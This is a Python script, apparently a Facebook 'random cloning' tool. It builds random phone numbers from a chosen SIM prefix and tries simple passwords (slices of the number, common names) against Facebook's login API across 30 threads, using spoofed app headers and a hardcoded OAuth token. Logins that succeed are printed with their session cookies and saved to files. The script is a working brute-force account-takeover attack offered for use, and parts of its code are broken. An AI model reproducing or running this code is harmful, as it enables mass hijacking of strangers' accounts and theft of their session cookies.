#WRITTEN BY MR.NIHAN
#FOLLOW : https://github.com/MR-NIHAN
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
os.system('pip install mechanize requests futures bs4==2 > /dev/null')
loop =[]
oks = []
cps = []
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
ugen=[]
for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['11' , '12' , '13' , '14' , '15'])
      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,100)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	'useragent.append',(uakua)
for ng in range(10000):
	a='Mozilla/5.0 (Linux; Android' 
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,116)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ng)
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''
\033[1;31m╔═╗─╔╦══╦╗─╔╦═══╦═╗─╔╗──╔═══╦═╗╔═╗
\033[1;32m║║╚╗║╠╣╠╣║─║║╔═╗║║╚╗║║──║╔═╗╠╗╚╝╔╝
\033[1;33m║╔╗╚╝║║║║╚═╝║║─║║╔╗╚╝║──║║─╚╝╚╗╔╝
\033[1;34m║║╚╗║║║║║╔═╗║╚═╝║║╚╗║╠══╣║╔═╗╔╝╚╗
\033[1;35m║║─║║╠╣╠╣║─║║╔═╗║║─║║╠══╣╚╩═╠╝╔╗╚╗
\033[1;36m╚╝─╚═╩══╩╝─╚╩╝─╚╩╝─╚═╝──╚═══╩═╝╚═╝
{warna}--------------------------------------------{B}
 Owner    : {C}DX.NIHAN {B}
 Guthub   : DX-NIHAN -404
 Facebook : DX NIHAN  CHOWDHURY
 Tools    : G{C}/{B}X{C}/{B}N{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/MR-DIPTO-404')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_DIPTO()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[NIHAN-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/NIHAN-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[NIHAN] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/NIHAN-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------lock check- def---------------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
#-------------end----------------#
MR_DIPTO()